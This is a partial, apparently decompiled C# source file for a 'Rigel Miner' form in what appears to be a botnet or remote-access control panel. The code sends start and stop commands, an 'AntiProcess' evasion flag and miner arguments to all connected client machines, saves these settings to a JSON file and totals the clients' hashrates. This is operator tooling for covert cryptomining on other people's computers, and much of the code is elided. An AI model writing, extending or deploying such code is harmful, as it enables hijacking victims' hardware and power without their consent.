...
public class FormMinerRigel : FormMaterial
{
	public bool work;
	...
	private void FormProcess_Load(object sender, EventArgs e)
	{
		...
		ChangeScheme(this);
		timer1.Start();
		if (File.Exists("local\\Rigel.json"))
		{
			MinerRigel minerRigel = JsonConvert.DeserializeObject<MinerRigel>(File.ReadAllText("local\\Rigel.json"));
			materialSwitch1.Checked = minerRigel.AntiProcess;
			rjTextBox2.Texts = minerRigel.Args;
			if (minerRigel.AutoStart)
			{
	...
	private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch7.Checked)
		{
			...
			{
				array[i].Send(LEB128.Write(new object[4] { "MinerRigel", "Start", materialSwitch1.Checked, rjTextBox2.Texts }));
			}
		}
		else
		{
			...
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Send(LEB128.Write(new object[2] { "MinerRigel", "Stop" }));
			}
		}
		Save();
	}
	...
	private void Save()
	{
		try
		{
			MinerRigel value = new MinerRigel
			{
				AntiProcess = materialSwitch1.Checked,
				Args = rjTextBox2.Texts,
				AutoStart = materialSwitch2.Checked
			};
			File.WriteAllText("local\\Rigel.json", JsonConvert.SerializeObject(value));
		}
		catch
		{
		}
	...
	{
		Text = $"Rigel Miner           Online [{GridClients.Rows.Count}]";
		float totalHashrate = 0f;
		foreach (DataGridViewRow row in (IEnumerable)GridClients.Rows)
		{
			try
			{
				if (row.Cells[3].Value != null && float.TryParse(row.Cells[3].Value.ToString().Replace(" MH/s", "").Replace(" Kh/s", "")
					.Replace(" H/s", "")
					.Trim()
					.Replace(',', '.'), NumberStyles.Float, CultureInfo.InvariantCulture, out var h))
				{
					if (row.Cells[3].Value.ToString().Contains("MH/s"))
					{
						h *= 1000000f;
					}
					else if (row.Cells[3].Value.ToString().Contains("Kh/s"))
					{
						h *= 1000f;
					}
					totalHashrate += h;
	...
	private static string FormatHashrate(float hashrate)
	{
		if (hashrate >= 1E+09f)
		{
			return $"Hashrate: {hashrate / 1E+09f:F2} GH/s";
		}
		if (hashrate >= 1000000f)
		{
	...
	private void InitializeComponent()
	{
		...
		this.materialSwitch2.Location = new System.Drawing.Point(400, 9);
		...
		this.GridClients.Location = new System.Drawing.Point(3, 369);
		...
		this.GridClients.Size = new System.Drawing.Size(971, 215);
		...
		this.panelChart.Location = new System.Drawing.Point(3, 164);
		...
		this.labelHashrate.Text = "Hashrate: 0 MH/s";
		...
		base.Name = "FormMinerRigel";
		this.Text = "Rigel Miner           Online [0]";
